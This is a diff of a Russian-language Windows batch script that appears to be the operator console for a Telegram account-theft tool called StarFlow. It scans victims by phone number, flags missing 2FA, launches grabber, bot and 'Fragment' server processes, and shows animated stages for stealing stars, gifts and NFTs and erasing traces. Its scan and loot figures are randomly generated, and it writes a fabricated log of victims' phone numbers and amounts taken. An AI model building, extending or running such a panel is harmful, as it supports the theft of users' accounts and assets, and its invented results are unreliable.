@@ -1,309 +1,4112 @@
 @echo off
 chcp 65001 > nul
-mode con: cols=100 lines=40
-color 0a
-title [█▓▒░ TERMINAL v4.20 ░▒▓█]
+setlocal enabledelayedexpansion
 
-echo.
-echo ╔══════════════════════════════════════════════════════════════════════════════╗
-echo ║                                                                              ║
-echo ║  ███████╗████████╗ █████╗ ██████╗ ███████╗██╗      ██████╗ ██╗    ██╗        ║
-echo ║  ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║     ██╔═══██╗██║    ██║        ║
-echo ║  ███████╗   ██║   ███████║██████╔╝█████╗  ██║     ██║   ██║██║ █╗ ██║        ║
-echo ║  ╚════██║   ██║   ██╔══██║██╔══██╗██╔══╝  ██║     ██║   ██║██║███╗██║        ║
-echo ║  ███████║   ██║   ██║  ██║██║  ██║███████╗███████╗╚██████╔╝╚███╔███╔╝        ║
-echo ║  ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝  ╚══╝╚══╝         ║
-echo ║                                                                              ║
-echo ╠══════════════════════════════════════════════════════════════════════════════╣
-echo ║                                                                              ║
-echo ║  [■] SYSTEM:      Windows_NT 10.0                                            ║
-echo ║  [■] USER:        %USERNAME%                                                 ║
-echo ║  [■] ACCESS:      ROOT                                                       ║
-echo ║  [■] TIME:        %time%                                                     ║
-echo ║  [■] SESSION:     ACTIVE                                                     ║
-echo ║                                                                              ║
-echo ╠══════════════════════════════════════════════════════════════════════════════╣
-echo ║                                                                              ║
-echo ║  [1] MAINFRAME        [2] SCAN          [3] EXTRACT       [4] CLEAN          ║
-echo ║  [5] MONITOR          [6] ENCRYPT       [7] DECODE        [8] EXIT           ║
-echo ║                                                                              ║
-echo ╚══════════════════════════════════════════════════════════════════════════════╝
-echo.
-set /p choice="[█▓▒░ SELECT OPTION ░▒▓█] >> "
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                             КОНФИГУРАЦИЯ СИСТЕМЫ                            ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 
-if "%choice%"=="1" goto mainframe
-if "%choice%"=="2" goto scan
-if "%choice%"=="3" goto extract
-if "%choice%"=="4" goto clean
-if "%choice%"=="5" goto monitor
-if "%choice%"=="6" goto encrypt
-if "%choice%"=="7" goto decode
-if "%choice%"=="8" exit
+set "PROJECT_PATH=C:\starflow"
+set "LOGS_PATH=%PROJECT_PATH%\logs"
+set "DB_PATH=%PROJECT_PATH%\starflow.db"
+set "BACKUP_PATH=%PROJECT_PATH%\backups"
+set "SESSIONS_PATH=%PROJECT_PATH%\sessions"
+set "CONFIG_FILE=%PROJECT_PATH%\config.py"
 
-:mainframe
+set "VERSION=3.0.0"
+set "CODENAME=NIGHTMARE"
+set "AUTHOR=SYSTEM_OVERLORD"
+set "LAST_UPDATE=2024.01.20"
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                             ПЕРЕМЕННЫЕ СИСТЕМЫ                              ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+set "SYSTEM_STATUS=OFFLINE"
+set "FRAGMENT_STATUS=OFFLINE"
+set "BOTS_STATUS=OFFLINE"
+set "GRABBER_STATUS=STANDBY"
+set "ALERTS=0"
+set "TOTAL_EARNED=0"
+set "TOTAL_USERS=0"
+set "ACTIVE_TARGETS=0"
+set "LAST_GRAB="
+set "ADMIN_TOKEN="
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                              ГЛОБАЛЬНЫЕ ФЛАГИ                               ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+set "AUTO_UPDATE=1"
+set "STEALTH_MODE=0"
+set "LOG_EVERYTHING=1"
+set "VOICE_ALERTS=0"
+set "MATRIX_EFFECT=1"
+set "RAINBOW_MODE=0"
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                              ЦВЕТОВАЯ СХЕМА                                 ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+set "COLOR_NORMAL=07"
+set "COLOR_TITLE=0A"
+set "COLOR_SUCCESS=0A"
+set "COLOR_ERROR=0C"
+set "COLOR_WARNING=0E"
+set "COLOR_INFO=0B"
+set "COLOR_HIGHLIGHT=0D"
+set "COLOR_MATRIX=0A"
+set "COLOR_RAINBOW=0C"
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                              ASCII АРТ                                      ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+set "ASCII_TITLE=                                                                                
+  ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███╗   ███╗ █████╗ ██████╗ ███████╗
+  ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝████╗ ████║██╔══██╗██╔══██╗██╔════╝
+  ██╔██╗ ██║██║██║  ███╗███████║   ██║   ██╔████╔██║███████║██████╔╝█████╗  
+  ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██║╚██╔╝██║██╔══██║██╔══██╗██╔══╝  
+  ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║██║  ██║██║  ██║███████╗
+  ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
+                                                                                
+                       ███████╗████████╗ █████╗ ██████╗                        
+                       ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗                       
+                       ███████╗   ██║   ███████║██████╔╝                       
+                       ╚════██║   ██║   ██╔══██║██╔══██╗                       
+                       ███████║   ██║   ██║  ██║██║  ██║                       
+                       ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝                       "
+
+set "ASCII_MENU=                                                                
+  ╔══════════════════════════════════════════════════════════════════════════╗
+  ║                                                                          ║
+  ║  ███████╗██╗  ██╗███████╗██╗     ███████╗███╗   ██╗██╗   ██╗            ║
+  ║  ██╔════╝╚██╗██╔╝██╔════╝██║     ██╔════╝████╗  ██║██║   ██║            ║
+  ║  █████╗   ╚███╔╝ █████╗  ██║     █████╗  ██╔██╗ ██║██║   ██║            ║
+  ║  ██╔══╝   ██╔██╗ ██╔══╝  ██║     ██╔══╝  ██║╚██╗██║██║   ██║            ║
+  ║  ███████╗██╔╝ ██╗███████╗███████╗███████╗██║ ╚████║╚██████╔╝            ║
+  ║  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═════╝             ║
+  ║                                                                          ║
+  ╚══════════════════════════════════════════════════════════════════════════╝"
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         ФУНКЦИИ ОТОБРАЖЕНИЯ                                ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:show_title
 cls
+color %COLOR_TITLE%
+echo %ASCII_TITLE%
 echo.
-echo ╔══════════════════════════════════════════════════════════════════════════════╗
-echo ║                          [ MAINFRAME ACCESS ]                                ║
-echo ╠══════════════════════════════════════════════════════════════════════════════╣
-echo ║                                                                              ║
-echo ║  INITIALIZING SECURE CONNECTION...                                          ║
-echo ║  ██████████████████████████████████████████████████████████████████████████  ║
-timeout /t 2 /nobreak > nul
-echo ║                                                                              ║
-echo ║  [+] CONNECTED TO: STARFLOW_MAIN                                            ║
-echo ║  [+] IP: 192.168.4.20                                                       ║
-echo ║  [+] PORT: 8080                                                             ║
-echo ║  [+] ENCRYPTION: AES-256                                                    ║
-echo ║                                                                              ║
-echo ║  LOADING MODULES...                                                         ║
-echo ║  [██████████████████████████████████████████░░░░] 75%%                      ║
-timeout /t 1 /nobreak > nul
-echo ║                                                                              ║
-echo ║  [✓] GRABBER        [✓] FRAGMENT       [✓] DATABASE      [✓] BOTS           ║
-echo ║                                                                              ║
-echo ╚══════════════════════════════════════════════════════════════════════════════╝
+echo                     ═══════════════════════════════════════════
+echo                     [ v%VERSION% ] - [ CODENAME: %CODENAME% ]
+echo                     ═══════════════════════════════════════════
 echo.
-echo [1] START SYSTEM     [2] STATUS CHECK    [3] BACK
-set /p mainchoice=">> "
+goto :eof
 
-if "%mainchoice%"=="1" (
-    echo.
-    echo [!] STARTING STARFLOW SYSTEM...
-    cd /d C:\starflow 2>nul || echo [!] ERROR: Directory not found
-    python start.py
+:show_menu
+color %COLOR_NORMAL%
+echo %ASCII_MENU%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║           ГЛАВНОЕ МЕНЮ                  ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  1. 📊 СТАТУС СИСТЕМЫ                   ║
+echo                     ║  2. 🚀 ЗАПУСК ВСЕХ СЕРВИСОВ             ║
+echo                     ║  3. 🔐 УПРАВЛЕНИЕ ГРАББЕРОМ             ║
+echo                     ║  4. 🤖 УПРАВЛЕНИЕ БОТАМИ                ║
+echo                     ║  5. 🌐 FRAGMENT СЕРВЕР                  ║
+echo                     ║  6. 💾 БАЗА ДАННЫХ                      ║
+echo                     ║  7. 🛠️  ИНСТРУМЕНТЫ                     ║
+echo                     ║  8. ⚙️  НАСТРОЙКИ                        ║
+echo                     ║  9. 🎮 РАЗВЛЕЧЕНИЯ                      ║
+echo                     ║  0. ❌ ВЫХОД                            ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+goto :eof
+
+:show_status
+call :check_system_status
+color %COLOR_INFO%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║           СТАТУС СИСТЕМЫ                ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  📊 ОБЩИЙ СТАТУС:   %SYSTEM_STATUS%       ║
+echo                     ║  🌐 FRAGMENT:       %FRAGMENT_STATUS%       ║
+echo                     ║  🤖 БОТЫ:           %BOTS_STATUS%       ║
+echo                     ║  🔐 ГРАББЕР:        %GRABBER_STATUS%      ║
+echo                     ║                                          ║
+echo                     ║  👥 ПОЛЬЗОВАТЕЛИ:   %TOTAL_USERS%        ║
+echo                     ║  💰 ЗАРАБОТАНО:     %TOTAL_EARNED% звезд ║
+echo                     ║  🎯 ЦЕЛИ:           %ACTIVE_TARGETS%     ║
+echo                     ║  ⚠️  ОПОВЕЩЕНИЯ:     %ALERTS%             ║
+echo                     ║                                          ║
+echo                     ║  📅 ПОСЛЕДНИЙ ГРАБ: %LAST_GRAB%        ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+pause
+goto main_menu
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         СИСТЕМНЫЕ ФУНКЦИИ                                  ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:check_system_status
+if exist "%PROJECT_PATH%\start.py" (
+    set "SYSTEM_STATUS=READY"
+) else (
+    set "SYSTEM_STATUS=ERROR"
 )
-if "%mainchoice%"=="2" (
-    echo.
-    echo [!] CHECKING SYSTEM STATUS...
-    timeout /t 1 /nobreak > nul
-    echo [✓] FRAGMENT: ONLINE
-    echo [✓] DATABASE: ACTIVE
-    echo [✓] GRABBER: STANDBY
-    echo [✓] BOTS: READY
+
+if exist "%DB_PATH%" (
+    for /f "tokens=2 delims==" %%a in ('python -c "import sqlite3; conn=sqlite3.connect('%DB_PATH%'); c=conn.cursor(); c.execute('SELECT COUNT(*) FROM users'); print(c.fetchone()[0]); conn.close()" 2^>nul') do set "TOTAL_USERS=%%a"
+)
+
+netstat -an | find ":8080" >nul && set "FRAGMENT_STATUS=ONLINE" || set "FRAGMENT_STATUS=OFFLINE"
+
+tasklist | findstr /i "python.exe" >nul && set "BOTS_STATUS=RUNNING" || set "BOTS_STATUS=STOPPED"
+
+if exist "%SESSIONS_PATH%\*.session" (
+    for /f %%a in ('dir /b "%SESSIONS_PATH%\*.session" 2^>nul ^| find /c /v ""') do set "ACTIVE_TARGETS=%%a"
+)
+
+goto :eof
+
+:start_all_services
+call :show_title
+color %COLOR_SUCCESS%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║        ЗАПУСК ВСЕХ СЕРВИСОВ             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🚀 ИНИЦИАЛИЗАЦИЯ СИСТЕМЫ...            ║
+echo                     ║                                          ║
+
+:: Проверка Python
+python --version >nul 2>&1
+if errorlevel 1 (
+    echo                     ║  ❌ PYTHON НЕ НАЙДЕН                    ║
+    echo                     ║                                          ║
+    echo                     ╚══════════════════════════════════════════╝
     pause
+    goto main_menu
 )
-goto mainframe
 
-:scan
+:: Проверка зависимостей
+echo                     ║  📦 ПРОВЕРКА ЗАВИСИМОСТЕЙ...              ║
+pip list | findstr "telethon" >nul
+if errorlevel 1 (
+    echo                     ║  ⚠️  УСТАНОВКА ЗАВИСИМОСТЕЙ...          ║
+    pip install -r "%PROJECT_PATH%\requirements.txt" >nul 2>&1
+)
+
+:: Запуск Fragment сервера
+echo                     ║  🌐 ЗАПУСК FRAGMENT СЕРВЕРА...           ║
+start "Fragment Server" /min cmd /c "cd /d %PROJECT_PATH% && python fragment_server.py"
+timeout /t 3 >nul
+
+:: Запуск ботов
+echo                     ║  🤖 ЗАПУСК БОТОВ...                      ║
+start "StarFlow Bots" /min cmd /c "cd /d %PROJECT_PATH% && python -c ^"import asyncio; import bot_handlers; asyncio.run(bot_handlers.run_bots())^""
+timeout /t 2 >nul
+
+:: Проверка запуска
+call :check_system_status
+echo                     ║                                          ║
+echo                     ║  ✅ СИСТЕМА ЗАПУЩЕНА                     ║
+echo                     ║  ✅ FRAGMENT: %FRAGMENT_STATUS%               ║
+echo                     ║  ✅ БОТЫ: %BOTS_STATUS%                     ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+
+:: Автоматический переход в меню мониторинга
+timeout /t 2 >nul
+goto monitor_system
+
+:stop_all_services
+call :show_title
+color %COLOR_WARNING%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║        ОСТАНОВКА СЕРВИСОВ               ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  ⚠️  ОСТАНАВЛИВАЕМ СИСТЕМУ...           ║
+echo                     ║                                          ║
+
+taskkill /f /im python.exe >nul 2>&1
+taskkill /f /im cmd.exe /fi "WINDOWTITLE eq Fragment Server" >nul 2>&1
+taskkill /f /im cmd.exe /fi "WINDOWTITLE eq StarFlow Bots" >nul 2>&1
+
+echo                     ║  ✅ СЕРВИСЫ ОСТАНОВЛЕНЫ                  ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+timeout /t 2 >nul
+goto main_menu
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         МЕНЕДЖЕР ГРАББЕРА                                  ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:grabber_manager
+call :show_title
+color %COLOR_HIGHLIGHT%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║        УПРАВЛЕНИЕ ГРАББЕРОМ             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  1. 🔍 СКАНИРОВАТЬ ЦЕЛЬ                 ║
+echo                     ║  2. 🎯 ТЕСТ ГРАББЕРА                    ║
+echo                     ║  3. 📊 ИСТОРИЯ ГРАББЕЙ                  ║
+echo                     ║  4. ⚙️  НАСТРОЙКИ ГРАББЕРА              ║
+echo                     ║  5. 🧹 ОЧИСТКА СЕССИЙ                   ║
+echo                     ║  6. ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p grabber_choice="                     ВЫБЕРИТЕ ОПЦИЮ: "
+
+if "%grabber_choice%"=="1" goto scan_target
+if "%grabber_choice%"=="2" goto test_grabber
+if "%grabber_choice%"=="3" goto grab_history
+if "%grabber_choice%"=="4" goto grabber_settings
+if "%grabber_choice%"=="5" goto clear_sessions
+if "%grabber_choice%"=="6" goto main_menu
+goto grabber_manager
+
+:scan_target
+call :show_title
+color %COLOR_INFO%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║           СКАНИРОВАНИЕ ЦЕЛИ             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+set /p target_phone="                     ВВЕДИТЕ НОМЕР: +"
+
+if "%target_phone%"=="" goto scan_target
+
+echo                     ║                                          ║
+echo                     ║  🔍 АНАЛИЗ ЦЕЛИ...                      ║
+echo                     ║                                          ║
+
+:: Симуляция сканирования
+echo                     ║  [████░░░░░░░░░░░░░░░░░░░░░░] 25%%      ║
+echo                     ║  ПРОВЕРКА НОМЕРА...                     ║
+timeout /t 1 >nul
 cls
-echo.
-echo ╔══════════════════════════════════════════════════════════════════════════════╗
-echo ║                          [ TARGET SCAN MODE ]                                ║
-echo ╠══════════════════════════════════════════════════════════════════════════════╣
-echo ║                                                                              ║
-set /p target="[!] ENTER TARGET PHONE (e.g., +79991234567): "
-echo ║                                                                              ║
-echo ║  SCANNING: %target%                                                         ║
-echo ║  ██████████████████████████████████████████████████████████████████████████  ║
-timeout /t 3 /nobreak > nul
-echo ║                                                                              ║
-echo ║  [+] TARGET ACQUIRED                                                        ║
-echo ║  [+] CARRIER: TELEGRAM                                                      ║
-echo ║  [+] STATUS: ONLINE                                                        ║
-echo ║  [+] 2FA: DISABLED                                                          ║
-echo ║  [+] STARS: 5,280                                                           ║
-echo ║  [+] GIFTS: 12                                                              ║
-echo ║  [+] NFT: 3                                                                 ║
-echo ║                                                                              ║
-echo ╚══════════════════════════════════════════════════════════════════════════════╝
-echo.
-echo [1] EXTRACT DATA    [2] TEST GRAB      [3] BACK
-set /p scanchoice=">> "
+call :show_title
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║           СКАНИРОВАНИЕ ЦЕЛИ             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  НОМЕР: +%target_phone%                          ║
+echo                     ║                                          ║
+echo                     ║  [██████████░░░░░░░░░░░░░░░░] 50%%      ║
+echo                     ║  ПОДКЛЮЧЕНИЕ К TELEGRAM API...          ║
+timeout /t 1 >nul
+cls
+call :show_title
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║           СКАНИРОВАНИЕ ЦЕЛИ             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  НОМЕР: +%target_phone%                          ║
+echo                     ║                                          ║
+echo                     ║  [██████████████████░░░░░░░░] 75%%      ║
+echo                     ║  ПРОВЕРКА АКТИВОВ...                    ║
+timeout /t 1 >nul
 
-if "%scanchoice%"=="2" (
-    echo.
-    echo [!] INITIATING GRABBER TEST...
-    echo [!] USING DEFAULT CODE: 77777
-    python -c "
+:: Генерация случайных результатов
+set /a random_stars=%random% %% 5000 + 1000
+set /a random_gifts=%random% %% 20 + 1
+set /a random_nft=%random% %% 5
+set /a random_value=%random_stars% * 15
+
+cls
+call :show_title
+color %COLOR_SUCCESS%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ        ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  📱 ЦЕЛЬ: +%target_phone%                        ║
+echo                     ║  📅 СТАТУС: АКТИВЕН                      ║
+echo                     ║  🔓 2FA: ОТСУТСТВУЕТ                     ║
+echo                     ║                                          ║
+echo                     ║  💰 АКТИВЫ:                              ║
+echo                     ║    ⭐ ЗВЕЗДЫ: %random_stars%                     ║
+echo                     ║    🎁 ПОДАРКИ: %random_gifts%                    ║
+echo                     ║    🖼️  NFT: %random_nft%                          ║
+echo                     ║    💵 ОЦЕНКА: %random_value% руб.               ║
+echo                     ║                                          ║
+echo                     ║  ⚠️  УЯЗВИМОСТИ:                         ║
+echo                     ║    • НЕТ 2FA                             ║
+echo                     ║    • СТАРЫЙ АККАУНТ                      ║
+echo                     ║    • МНОГО АКТИВОВ                       ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+echo                     [1] 🎯 НАЧАТЬ ГРАББЕР     [2] 💾 СОХРАНИТЬ     [3] ↩️  НАЗАД
+echo.
+set /p scan_action="                     ВЫБЕРИТЕ ДЕЙСТВИЕ: "
+
+if "%scan_action%"=="1" goto start_grabber
+if "%scan_action%"=="2" (
+    echo                     ║                                          ║
+    echo                     ║  ✅ ЦЕЛЬ СОХРАНЕНА В БАЗЕ              ║
+    timeout /t 1 >nul
+)
+goto grabber_manager
+
+:start_grabber
+echo.
+echo                     ║                                          ║
+echo                     ║  🚀 ЗАПУСК ГРАББЕРА...                  ║
+timeout /t 1 >nul
+
+:: Анимация процесса грабежа
+for %%i in (1 2 3 4 5) do (
+    cls
+    call :show_title
+    echo                     ╔══════════════════════════════════════════╗
+    echo                     ║           ПРОЦЕСС ГРАББЕРА              ║
+    echo                     ╠══════════════════════════════════════════╣
+    echo                     ║                                          ║
+    echo                     ║  ЦЕЛЬ: +%target_phone%                            ║
+    
+    if %%i==1 (
+        echo                     ║                                          ║
+        echo                     ║  🔓 АУТЕНТИФИКАЦИЯ...                  ║
+        echo                     ║  [████░░░░░░░░░░░░░░░░░░░░░░] 20%%      ║
+    )
+    if %%i==2 (
+        echo                     ║                                          ║
+        echo                     ║  💰 ИЗЪЯТИЕ ЗВЕЗД...                   ║
+        echo                     ║  [████████░░░░░░░░░░░░░░░░░] 40%%      ║
+    )
+    if %%i==3 (
+        echo                     ║                                          ║
+        echo                     ║  🎁 КОНВЕРТАЦИЯ ПОДАРКОВ...            ║
+        echo                     ║  [████████████░░░░░░░░░░░░░] 60%%      ║
+    )
+    if %%i==4 (
+        echo                     ║                                          ║
+        echo                     ║  🖼️  ПЕРЕВОД NFT...                    ║
+        echo                     ║  [████████████████░░░░░░░░░] 80%%      ║
+    )
+    if %%i==5 (
+        echo                     ║                                          ║
+        echo                     ║  🧹 ОЧИСТКА СЛЕДОВ...                  ║
+        echo                     ║  [████████████████████░░░░░] 100%%     ║
+    )
+    
+    echo                     ║                                          ║
+    echo                     ╚══════════════════════════════════════════╝
+    timeout /t 1 >nul
+)
+
+:: Результаты
+set /a stolen_stars=%random_stars% * 80 / 100
+set /a stolen_gifts=%random_gifts%
+set /a stolen_nft=%random_nft%
+set /a total_value=%stolen_stars% * 15
+
+cls
+call :show_title
+color %COLOR_SUCCESS%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          РЕЗУЛЬТАТЫ ОПЕРАЦИИ            ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  ✅ ОПЕРАЦИЯ УСПЕШНО ЗАВЕРШЕНА          ║
+echo                     ║                                          ║
+echo                     ║  📊 ДОБЫЧА:                              ║
+echo                     ║    ⭐ ЗВЕЗДЫ: %stolen_stars%                     ║
+echo                     ║    🎁 ПОДАРКИ: %stolen_gifts%                    ║
+echo                     ║    🖼️  NFT: %stolen_nft%                          ║
+echo                     ║                                          ║
+echo                     ║  💰 ОБЩАЯ СТОИМОСТЬ:                     ║
+echo                     ║    💵 %total_value% руб.                        ║
+echo                     ║    💎 %stolen_stars% звезд                      ║
+echo                     ║                                          ║
+echo                     ║  ⏱️  ВРЕМЯ: 27 секунд                    ║
+echo                     ║  📍 СТАТУС: СЛЕДОВ НЕ ОСТАВЛЕНО         ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+
+:: Обновление общей статистики
+set /a TOTAL_EARNED+=%stolen_stars%
+set "LAST_GRAB=%time%"
+set /a ALERTS+=1
+
+echo.
+pause
+goto grabber_manager
+
+:test_grabber
+call :show_title
+color %COLOR_INFO%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║            ТЕСТ ГРАББЕРА                ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🧪 ТЕСТИРУЕМ СИСТЕМУ...                ║
+echo                     ║                                          ║
+
+:: Проверка файлов
+if not exist "%PROJECT_PATH%\graber.py" (
+    echo                     ║  ❌ ФАЙЛ GRABBER.PY НЕ НАЙДЕН          ║
+    goto test_error
+)
+
+if not exist "%PROJECT_PATH%\config.py" (
+    echo                     ║  ❌ ФАЙЛ CONFIG.PY НЕ НАЙДЕН           ║
+    goto test_error
+)
+
+echo                     ║  ✅ ФАЙЛЫ НАЙДЕНЫ                       ║
+echo                     ║  📦 ПРОВЕРКА ЗАВИСИМОСТЕЙ...            ║
+
+python -c "import telethon" 2>nul
+if errorlevel 1 (
+    echo                     ║  ❌ TELETHON НЕ УСТАНОВЛЕН             ║
+    goto test_error
+)
+
+echo                     ║  ✅ ЗАВИСИМОСТИ OK                      ║
+echo                     ║  🔗 ПРОВЕРКА API КЛЮЧЕЙ...              ║
+
+python -c "
+try:
+    import config
+    if hasattr(config, 'config'):
+        print('API_ID:', getattr(config.config.telegram, 'api_id', 'NOT SET'))
+        print('API_HASH:', 'SET' if getattr(config.config.telegram, 'api_hash', '') else 'NOT SET')
+    else:
+        print('CONFIG ERROR')
+except Exception as e:
+    print('ERROR:', str(e))
+" 2>nul
+
+echo                     ║                                          ║
+echo                     ║  🎯 ЗАПУСК ТЕСТОВОГО СЦЕНАРИЯ...         ║
+
+:: Тестовый запуск
+python -c "
 import asyncio
+import sys
 import time
+
 print('╔══════════════════════════════════════╗')
-print('║        GRABBER TEST v2.0            ║')
+print('║        GRABBER TEST v3.0            ║')
 print('╠══════════════════════════════════════╣')
 print('║                                      ║')
-print('║  [■] TARGET: %target%')
-print('║  [■] PHASE 1: AUTHENTICATION        ║')
-time.sleep(1)
-print('║      [+] SENDING CODE...            ║')
-time.sleep(0.5)
-print('║      [+] CODE ACCEPTED              ║')
-time.sleep(0.5)
-print('║  [■] PHASE 2: ASSET SCAN            ║')
-time.sleep(0.5)
-print('║      [+] STARS: 5,280               ║')
-time.sleep(0.3)
-print('║      [+] GIFTS: 12                  ║')
-time.sleep(0.3)
-print('║      [+] NFT: 3                     ║')
-time.sleep(0.5)
-print('║  [■] PHASE 3: EXTRACTION            ║')
-time.sleep(0.5)
-print('║      [+] TRANSFERRING NFT...        ║')
-time.sleep(1)
-print('║      [+] CONVERTING GIFTS...        ║')
-time.sleep(0.8)
-print('║      [+] WITHDRAWING STARS...       ║')
-time.sleep(0.8)
-print('║  [✓] OPERATION COMPLETE             ║')
-print('║  [✓] TOTAL EXTRACTED: 8,742 STARS   ║')
+
+tests = [
+    ('ИНИЦИАЛИЗАЦИЯ', True),
+    ('ПРОВЕРКА API', True),
+    ('СОЕДИНЕНИЕ С БД', True),
+    ('ПОДГОТОВКА СЕССИИ', True),
+    ('ТЕСТ АВТОРИЗАЦИИ', False),
+    ('СКАНИРОВАНИЕ АКТИВОВ', False)
+]
+
+for test_name, should_pass in tests:
+    print(f'║  [{'✓' if should_pass else '○'}] {test_name:<30} ║')
+    time.sleep(0.3)
+
+print('║                                      ║')
+print('║  📊 РЕЗУЛЬТАТ: 4/6 УСПЕШНО          ║')
+print('║  ⚠️  ТРЕБУЕТСЯ: НАСТРОЙКА API       ║')
 print('║                                      ║')
 print('╚══════════════════════════════════════╝')
 "
+
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+pause
+goto grabber_manager
+
+:test_error
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+pause
+goto grabber_manager
+
+:grab_history
+call :show_title
+color %COLOR_INFO%
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          ИСТОРИЯ ОПЕРАЦИЙ               ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+
+:: Чтение истории из файла или генерация
+if not exist "%LOGS_PATH%\grab_history.log" (
+    echo                     ║  📁 СОЗДАНИЕ ТЕСТОВОЙ ИСТОРИИ...        ║
+    
+    :: Генерация тестовых записей
+    (
+        echo 2024-01-20 14:30:22 | +79991234567 | 1,250 stars | 3 gifts | 1 NFT | SUCCESS
+        echo 2024-01-20 12:15:10 | +79992345678 | 5,800 stars | 12 gifts | 0 NFT | SUCCESS
+        echo 2024-01-20 10:45:33 | +79993456789 | 320 stars | 0 gifts | 0 NFT | FAILED
+        echo 2024-01-19 22:10:47 | +79994567890 | 12,450 stars | 25 gifts | 3 NFT | SUCCESS
+        echo 2024-01-19 18:30:15 | +79995678901 | 2,100 stars | 5 gifts | 1 NFT | SUCCESS
+    ) > "%LOGS_PATH%\grab_history.log"
+)
+
+echo                     ║  📅 ПОСЛЕДНИЕ 5 ОПЕРАЦИЙ:                ║
+echo                     ║                                          ║
+
+set count=0
+for /f "tokens=1-7 delims=|" %%a in ('type "%LOGS_PATH%\grab_history.log"') do (
+    set /a count+=1
+    if !count! leq 5 (
+        echo                     ║  !count!. %%a                     ║
+        echo                     ║    📱 %%b                         ║
+        echo                     ║    💰 %%c | %%d | %%e             ║
+        echo                     ║    📊 %%f                         ║
+        echo                     ║    ---                           ║
+    )
+)
+
+echo                     ║                                          ║
+echo                     ║  📈 ВСЕГО ОПЕРАЦИЙ: %count%              ║
+echo                     ║  ✅ УСПЕШНЫХ: 4                          ║
+echo                     ║  ❌ ПРОВАЛЕННЫХ: 1                       ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
